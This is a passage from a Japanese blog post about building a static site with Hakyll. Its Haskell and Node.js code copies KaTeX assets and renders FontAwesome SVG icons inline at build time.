<span id="cb17-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">ListField</span> ctx items <span class="ot">&lt;-</span> lookupMeta <span class="st">&quot;posts&quot;</span></span>
<span id="cb17-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-5" aria-hidden="true" tabindex="-1"></a>    forM_ (<span class="fu">zip</span> (<span class="fu">repeat</span> ctx) items) <span class="op">$</span> <span class="fu">flip</span> withContext <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb17-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-6" aria-hidden="true" tabindex="-1"></a>      <span class="dt">StringField</span> title <span class="ot">&lt;-</span> lookupMeta <span class="st">&quot;title&quot;</span></span>
<span id="cb17-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb17-7" aria-hidden="true" tabindex="-1"></a>      li_ <span class="op">$</span> toHtml title</span></code></pre></div>
<p>余談ですが、<a href="https://hackage.haskell.org/package/hakyll-4.11.0.0/docs/Hakyll-Web-Template-Internal-Element.html#t:TemplateExpr"><code>TemplateExpr</code></a> などの扱いを調べるために Hakyll のソースを眺めたときに「はぇーーーーっ」ってなりました。個人的にとても衝撃的で、言語処理系を書いてみたくなりました。コンパイラの講義を履修していたこともあってその方面のことにもちょっと興味あったので、いつかやってみたいなと。</p>
<h3 id="fontawesome-の-svg-を記事生成時に埋め込みたい">FontAwesome の SVG を記事生成時に埋め込みたい</h3>
<p>フロントエンドライブラリは、素直に npm で管理することにしました。例えば <a href="https://khan.github.io/KaTeX/">KaTeX</a> の css やフォントをコピーする rule はこんな感じでです。<code>"*.js"</code> をコピーしていないのは、今回も例によってビルド時にレンダリングしており、必要ないためです。</p>
<div class="sourceCode" id="cb18"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb18-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb18-1" aria-hidden="true" tabindex="-1"></a>match (<span class="st">&quot;node_modules/katex/dist/**&quot;</span> <span class="op">.&amp;&amp;.</span> complement <span class="st">&quot;**.js&quot;</span>) <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb18-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb18-2" aria-hidden="true" tabindex="-1"></a>  route <span class="op">$</span> gsubRoute <span class="st">&quot;node_modules/katex/dist/&quot;</span> (<span class="fu">const</span> <span class="st">&quot;vendor/katex/&quot;</span>)</span>
<span id="cb18-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb18-3" aria-hidden="true" tabindex="-1"></a>  compile copyFileCompiler</span></code></pre></div>
<p>こうやってパッケージマネージャが管理するディレクトリ内を参照するのがあまり気にらないのですが、そういうものなんですかね…</p>
<p>さて、<a href="https://fontawesome.com/">FontAwesome</a> の話に戻ります。知らないうちにバージョン 5.x が出ていた FontAwesome は、従来の Web フォントを使ったもののほかに、SVG を利用できるようになっていました。けれども、<a href="https://fontawesome.com/how-to-use/svg-with-js">推奨された使い方</a>は JavaScript により表示された時に置き換えるというもの。うーん、静的サイトジェネレータ大好きマンとしては納得できないですね。</p>
<p>幸いにも、<a href="https://fontawesome.com/how-to-use/server-side-rendering">Server Side Rendering に関するドキュメント</a> がありましたので、この辺を参考にやってみましょう。</p>
<p>まず、表示に必要になる CSS です。どうやら <code>fontawesome.dom.css()</code> を呼び出せばいいようなので、こんな感じの JavaScript を用意して</p>
<div class="sourceCode" id="cb19"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env node</span></span>
<span id="cb19-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> fontawesome <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome'</span>)<span class="op">;</span></span>
<span id="cb19-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> brands      <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome-free-brands'</span>)<span class="op">.</span><span class="at">default</span><span class="op">;</span></span>
<span id="cb19-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> solid       <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome-free-solid'</span>)<span class="op">.</span><span class="at">default</span><span class="op">;</span></span>
<span id="cb19-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-7" aria-hidden="true" tabindex="-1"></a>fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="fu">add</span>(brands)<span class="op">;</span></span>
<span id="cb19-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-8" aria-hidden="true" tabindex="-1"></a>fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="fu">add</span>(solid)<span class="op">;</span></span>
<span id="cb19-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb19-10" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(fontawesome<span class="op">.</span><span class="at">dom</span><span class="op">.</span><span class="fu">css</span>())<span class="op">;</span></span></code></pre></div>
<p>Haskell 側でこんな感じの rule を書いて、その実行結果を出力してみました。</p>
<div class="sourceCode" id="cb20"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb20-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb20-1" aria-hidden="true" tabindex="-1"></a>create [<span class="st">&quot;stylesheets/fontawesome.css&quot;</span>] <span class="op">$</span> <span class="kw">do</span></span>
<span id="cb20-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb20-2" aria-hidden="true" tabindex="-1"></a>  route   idRoute</span>
<span id="cb20-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb20-3" aria-hidden="true" tabindex="-1"></a>  compile <span class="op">$</span> unsafeCompiler (readProcess <span class="st">&quot;./fontawesome_css.js&quot;</span> [] [])</span>
<span id="cb20-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb20-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&gt;&gt;=</span> makeItem <span class="op">.</span> compressCss</span></code></pre></div>
<p>次はアイコンです。<a href="https://fontawesome.com/how-to-use/font-awesome-api#icon">ドキュメント</a>によると、<code>fontawesome.icon({prefix: prefix, iconName: name}).abstract</code> でこんな感じの情報を取得できるようです。これ、このまま HTML の要素にできそうですね。</p>
<blockquote>
<div class="sourceCode" id="cb21"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-1" aria-hidden="true" tabindex="-1"></a>[</span>
<span id="cb21-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-2" aria-hidden="true" tabindex="-1"></a>  {</span>
<span id="cb21-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-3" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;tag&quot;</span><span class="op">:</span> <span class="st">&quot;svg&quot;</span><span class="op">,</span></span>
<span id="cb21-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-4" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;attributes&quot;</span><span class="op">:</span> {</span>
<span id="cb21-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-5" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;data-prefix&quot;</span><span class="op">:</span> <span class="st">&quot;fa&quot;</span><span class="op">,</span></span>
<span id="cb21-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-6" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;data-icon&quot;</span><span class="op">:</span> <span class="st">&quot;user&quot;</span><span class="op">,</span></span>
<span id="cb21-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-7" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;class&quot;</span><span class="op">:</span> <span class="st">&quot;svg-inline--fa fa-user fa-w-16&quot;</span><span class="op">,</span></span>
<span id="cb21-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-8" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;role&quot;</span><span class="op">:</span> <span class="st">&quot;img&quot;</span><span class="op">,</span></span>
<span id="cb21-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-9" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;xmlns&quot;</span><span class="op">:</span> <span class="st">&quot;http://www.w3.org/2000/svg&quot;</span><span class="op">,</span></span>
<span id="cb21-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-10" aria-hidden="true" tabindex="-1"></a>      <span class="st">&quot;viewBox&quot;</span><span class="op">:</span> <span class="st">&quot;0 0 512 512&quot;</span></span>
<span id="cb21-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-11" aria-hidden="true" tabindex="-1"></a>    }<span class="op">,</span></span>
<span id="cb21-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-12" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;children&quot;</span><span class="op">:</span> [</span>
<span id="cb21-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-13" aria-hidden="true" tabindex="-1"></a>      {</span>
<span id="cb21-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-14" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;tag&quot;</span><span class="op">:</span> <span class="st">&quot;path&quot;</span><span class="op">,</span></span>
<span id="cb21-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-15" aria-hidden="true" tabindex="-1"></a>        <span class="st">&quot;attributes&quot;</span><span class="op">:</span> {</span>
<span id="cb21-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-16" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;fill&quot;</span><span class="op">:</span> <span class="st">&quot;currentColor&quot;</span><span class="op">,</span></span>
<span id="cb21-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-17" aria-hidden="true" tabindex="-1"></a>          <span class="st">&quot;d&quot;</span><span class="op">:</span> <span class="st">&quot;M96…112z&quot;</span></span>
<span id="cb21-18"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-18" aria-hidden="true" tabindex="-1"></a>        }</span>
<span id="cb21-19"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-19" aria-hidden="true" tabindex="-1"></a>      }</span>
<span id="cb21-20"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-20" aria-hidden="true" tabindex="-1"></a>    ]</span>
<span id="cb21-21"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-21" aria-hidden="true" tabindex="-1"></a>  }</span>
<span id="cb21-22"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb21-22" aria-hidden="true" tabindex="-1"></a>]</span></code></pre></div>
</blockquote>
<p>ということで、まずは こんな感じの JavaScript で全アイコンの情報を JSON で出力します。</p>
<div class="sourceCode" id="cb22"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb22-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env node</span></span>
<span id="cb22-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> fontawesome <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome'</span>)<span class="op">;</span></span>
<span id="cb22-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> brands      <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome-free-brands'</span>)<span class="op">.</span><span class="at">default</span><span class="op">;</span></span>
<span id="cb22-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> solid       <span class="op">=</span> <span class="pp">require</span>(<span class="st">'@fortawesome/fontawesome-free-solid'</span>)<span class="op">.</span><span class="at">default</span><span class="op">;</span></span>
<span id="cb22-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-7" aria-hidden="true" tabindex="-1"></a>fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="fu">add</span>(brands)<span class="op">;</span></span>
<span id="cb22-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-8" aria-hidden="true" tabindex="-1"></a>fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="fu">add</span>(solid)<span class="op">;</span></span>
<span id="cb22-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb22-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> o <span class="op">=</span> {}<span class="op">;</span></span>
<span id="cb22-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> (prefix <span class="kw">in</span> fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="at">definitions</span>) {</span>
<span id="cb22-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-12" aria-hidden="true" tabindex="-1"></a>  o[prefix] <span class="op">=</span> {}<span class="op">;</span></span>
<span id="cb22-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-13" aria-hidden="true" tabindex="-1"></a>  <span class="cf">for</span> (name <span class="kw">in</span> fontawesome<span class="op">.</span><span class="at">library</span><span class="op">.</span><span class="at">definitions</span>[prefix]) {</span>
<span id="cb22-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-14" aria-hidden="true" tabindex="-1"></a>    o[prefix][name] <span class="op">=</span> fontawesome<span class="op">.</span><span class="fu">icon</span>({<span class="dt">prefix</span><span class="op">:</span> prefix<span class="op">,</span> <span class="dt">iconName</span><span class="op">:</span> name})<span class="op">.</span><span class="at">abstract</span>[<span class="dv">0</span>]<span class="op">;</span></span>
<span id="cb22-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-15" aria-hidden="true" tabindex="-1"></a>  }</span>
<span id="cb22-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-16" aria-hidden="true" tabindex="-1"></a>}</span>
<span id="cb22-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb22-17" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(o))<span class="op">;</span></span></code></pre></div>
<p>Haskell 側ではまず、JS 側で出力した JSON を読み込むためのデータ構造を作ってやります。<a href="https://hackage.haskell.org/package/aeson">Aeson</a> 大好き。</p>
<div class="sourceCode" id="cb23"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb23-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="kw">data</span> <span class="dt">Element</span> <span class="ot">=</span> <span class="dt">Element</span> {<span class="ot"> tag        ::</span> <span class="dt">T.Text</span></span>
<span id="cb23-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-2" aria-hidden="true" tabindex="-1"></a>                       ,<span class="ot"> attributes ::</span> [<span class="dt">Attribute</span>]</span>
<span id="cb23-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-3" aria-hidden="true" tabindex="-1"></a>                       ,<span class="ot"> children   ::</span> [<span class="dt">Element</span>]</span>
<span id="cb23-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-4" aria-hidden="true" tabindex="-1"></a>                       }</span>
<span id="cb23-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-5" aria-hidden="true" tabindex="-1"></a>             <span class="kw">deriving</span> <span class="dt">Show</span></span>
<span id="cb23-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-6" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="kw">instance</span> <span class="dt">FromJSON</span> <span class="dt">Element</span> <span class="kw">where</span></span>
<span id="cb23-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-8" aria-hidden="true" tabindex="-1"></a>  parseJSON <span class="ot">=</span> withObject <span class="st">&quot;Element&quot;</span> <span class="op">$</span> \o <span class="ot">-&gt;</span> <span class="kw">do</span></span>
<span id="cb23-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-9" aria-hidden="true" tabindex="-1"></a>    tag        <span class="ot">&lt;-</span> o <span class="op">.:</span> <span class="st">&quot;tag&quot;</span></span>
<span id="cb23-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-10" aria-hidden="true" tabindex="-1"></a>    attributes <span class="ot">&lt;-</span> objectToAttributes <span class="op">&lt;$&gt;</span> o <span class="op">.:?</span> <span class="st">&quot;attributes&quot;</span> <span class="op">.!=</span> HM.empty</span>
<span id="cb23-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-11" aria-hidden="true" tabindex="-1"></a>    children   <span class="ot">&lt;-</span> o <span class="op">.:?</span> <span class="st">&quot;children&quot;</span> <span class="op">.!=</span> []</span>
<span id="cb23-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-12" aria-hidden="true" tabindex="-1"></a>    <span class="fu">return</span> <span class="dt">Element</span> {<span class="op">..</span>}</span>
<span id="cb23-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">where</span> objectToAttributes <span class="ot">=</span> <span class="fu">map</span> (<span class="fu">uncurry</span> makeAttribute) <span class="op">.</span> HM.toList</span>
<span id="cb23-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-15" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-16" aria-hidden="true" tabindex="-1"></a><span class="co">-- FontAwesomeIcons [(prefix, [(name, icon-meta)])]</span></span>
<span id="cb23-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-17" aria-hidden="true" tabindex="-1"></a><span class="kw">type</span> <span class="dt">FontAwesomeIcons</span> <span class="ot">=</span> <span class="dt">HM.HashMap</span> <span class="dt">T.Text</span> (<span class="dt">HM.HashMap</span> <span class="dt">T.Text</span> <span class="dt">Element</span>)</span>
<span id="cb23-18"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-18" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb23-19"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-19" aria-hidden="true" tabindex="-1"></a><span class="ot">parseFontAwesomeIcons ::</span> <span class="dt">String</span> <span class="ot">-&gt;</span> <span class="dt">Maybe</span> <span class="dt">FontAwesomeIcons</span></span>
<span id="cb23-20"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb23-20" aria-hidden="true" tabindex="-1"></a>parseFontAwesomeIcons <span class="ot">=</span> decode <span class="op">.</span> BSL.pack</span></code></pre></div>
<p>次に、<code>FontAwesomeIcons</code> と <code>prefix</code>、<code>name</code> を与えたら Lucid の <code>HtmlT</code> を返す関数を作ってやります。</p>
<div class="sourceCode" id="cb24"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb24-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ot">fontawesome ::</span> <span class="dt">Monad</span> m <span class="ot">=&gt;</span> <span class="dt">FontAwesomeIcons</span> <span class="ot">-&gt;</span> <span class="dt">T.Text</span> <span class="ot">-&gt;</span> <span class="dt">T.Text</span> <span class="ot">-&gt;</span> <span class="dt">Maybe</span> (<span class="dt">HtmlT</span> m ())</span>
<span id="cb24-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-2" aria-hidden="true" tabindex="-1"></a>fontawesome db prefix name <span class="ot">=</span> toLucid <span class="op">&lt;$&gt;</span> (HM.lookup prefix db <span class="op">&gt;&gt;=</span> HM.lookup name)</span>
<span id="cb24-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb24-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-4" aria-hidden="true" tabindex="-1"></a><span class="ot">toLucid ::</span> <span class="dt">Monad</span> m <span class="ot">=&gt;</span> <span class="dt">Element</span> <span class="ot">-&gt;</span> <span class="dt">HtmlT</span> m ()</span>
<span id="cb24-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-5" aria-hidden="true" tabindex="-1"></a>toLucid <span class="ot">=</span> termWith <span class="op">&lt;$&gt;</span> tag <span class="op">&lt;*&gt;</span> attributes <span class="op">&lt;*&gt;</span> children'</span>
<span id="cb24-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb24-6" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span> children' <span class="ot">=</span> <span class="fu">mconcat</span> <span class="op">.</span> <span class="fu">map</span> toLucid <span class="op">.</span> children</span></code></pre></div>
<p>いい感じですね。</p>
<div class="sourceCode" id="cb25"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb25-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb25-1" aria-hidden="true" tabindex="-1"></a>λ<span class="op">&gt;</span> <span class="op">:</span>m <span class="op">+</span><span class="dt">System.Process</span> </span>
<span id="cb25-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb25-2" aria-hidden="true" tabindex="-1"></a>λ<span class="op">&gt;</span> <span class="dt">Just</span> db <span class="ot">&lt;-</span> parseFontAwesomeIcons <span class="op">&lt;$&gt;</span> readProcess <span class="st">&quot;fontawesome_list.js&quot;</span> [] []</span>
<span id="cb25-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb25-3" aria-hidden="true" tabindex="-1"></a>λ<span class="op">&gt;</span> fontawesome db <span class="st">&quot;fas&quot;</span> <span class="st">&quot;plus&quot;</span></span>
<span id="cb25-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="dt">Just</span> <span class="op">&lt;</span>svg xmlns<span class="ot">=</span><span class="st">&quot;http://www.w3.org/2000/svg&quot;</span> aria<span class="op">-</span>hidden<span class="ot">=</span><span class="st">&quot;true&quot;</span> <span class="kw">data</span><span class="op">-</span>prefix<span class="ot">=</span><span class="st">&quot;fas&quot;</span> viewBox<span class="ot">=</span><span class="st">&quot;0 0 448 512&quot;</span> role<span class="ot">=</span><span class="st">&quot;img&quot;</span> <span class="kw">class</span><span class="ot">=</span><span class="st">&quot;svg-inline--fa fa-plus fa-w-14&quot;</span> <span class="kw">data</span><span class="op">-</span>icon<span class="ot">=</span><span class="st">&quot;plus&quot;</span><span class="op">&gt;&lt;</span>path d<span class="ot">=</span><span class="st">&quot;M448 294.2v-76.4c0-13.3-10.7-24-24-24H286.2V56c0-13.3-10.7-24-24-24h-76.4c-13.3 0-24 10.7-24 24v137.8H24c-13.3 0-24 10.7-24 24v76.4c0 13.3 10.7 24 24 24h137.8V456c0 13.3 10.7 24 24 24h76.4c13.3 0 24-10.7 24-24V318.2H424c13.3 0 24-10.7 24-24z&quot;</span> fill<span class="ot">=</span><span class="st">&quot;currentColor&quot;</span><span class="op">&gt;&lt;/</span>path<span class="op">&gt;&lt;/</span>svg<span class="op">&gt;</span></span></code></pre></div>
<p>これをテンプレートから直接呼んでもいいのですが、<a href="https://hackage.haskell.org/package/tagsoup-0.14.6/docs/Text-HTML-TagSoup-Tree.html"><code>Text.HTML.TagSoup.Tree</code></a> でページの HTML をパースし、<code>"fas fa-plus"</code> のようなclass が設定された要素を置換するコードを書いてみました。雑な実装ですが、こんな感じ。</p>
<div class="sourceCode" id="cb26"><pre class="sourceCode haskell"><code class="sourceCode haskell"><span id="cb26-1"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ot">renderFontAwesome ::</span> <span class="dt">FontAwesomeIcons</span> <span class="ot">-&gt;</span> <span class="dt">Item</span> <span class="dt">String</span> <span class="ot">-&gt;</span> <span class="dt">Compiler</span> (<span class="dt">Item</span> <span class="dt">String</span>)</span>
<span id="cb26-2"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-2" aria-hidden="true" tabindex="-1"></a>renderFontAwesome icons <span class="ot">=</span> <span class="fu">return</span> <span class="op">.</span> <span class="fu">fmap</span></span>
<span id="cb26-3"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-3" aria-hidden="true" tabindex="-1"></a>    (TS.renderTreeOptions tagSoupOption <span class="op">.</span> TS.transformTree renderFontAwesome' <span class="op">.</span> TS.parseTree)</span>
<span id="cb26-4"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-4" aria-hidden="true" tabindex="-1"></a>  <span class="kw">where</span></span>
<span id="cb26-5"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-5" aria-hidden="true" tabindex="-1"></a>    renderFontAwesome' tag<span class="op">@</span>(<span class="dt">TS.TagBranch</span> <span class="st">&quot;i&quot;</span> as []) <span class="ot">=</span></span>
<span id="cb26-6"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-6" aria-hidden="true" tabindex="-1"></a>      <span class="kw">case</span> toFontAwesome <span class="op">$</span> classes as <span class="kw">of</span></span>
<span id="cb26-7"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-7" aria-hidden="true" tabindex="-1"></a>           <span class="dt">Just</span> html <span class="ot">-&gt;</span> TS.parseTree <span class="op">$</span> TL.unpack <span class="op">$</span> renderText html</span>
<span id="cb26-8"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-8" aria-hidden="true" tabindex="-1"></a>           <span class="dt">Nothing</span>   <span class="ot">-&gt;</span> [tag]</span>
<span id="cb26-9"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-9" aria-hidden="true" tabindex="-1"></a>    renderFontAwesome' tag <span class="ot">=</span> [tag]</span>
<span id="cb26-10"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb26-11"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-11" aria-hidden="true" tabindex="-1"></a>    toFontAwesome (prefix<span class="op">:</span>(<span class="ch">'f'</span><span class="op">:</span><span class="ch">'a'</span><span class="op">:</span><span class="ch">'-'</span><span class="op">:</span>name)<span class="op">:</span>cs) <span class="ot">=</span></span>
<span id="cb26-12"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-12" aria-hidden="true" tabindex="-1"></a>      <span class="kw">let</span> prefix'  <span class="ot">=</span> T.pack prefix</span>
<span id="cb26-13"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-13" aria-hidden="true" tabindex="-1"></a>          name'    <span class="ot">=</span> T.pack name</span>
<span id="cb26-14"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-14" aria-hidden="true" tabindex="-1"></a>          classes' <span class="ot">=</span> T.pack <span class="op">$</span> <span class="st">&quot; &quot;</span> <span class="op">++</span> <span class="fu">unwords</span> cs</span>
<span id="cb26-15"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-15" aria-hidden="true" tabindex="-1"></a>      <span class="kw">in</span>  <span class="fu">fmap</span> (<span class="ot">`with`</span> [class_ classes']) (fontawesome icons prefix' name')</span>
<span id="cb26-16"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-16" aria-hidden="true" tabindex="-1"></a>    toFontAwesome _ <span class="ot">=</span> <span class="dt">Nothing</span></span>
<span id="cb26-17"><a href="https://blog.myon.info/entry/2018/03/21/hakyll/#cb26-17" aria-hidden="true" tabindex="-1"></a></span>
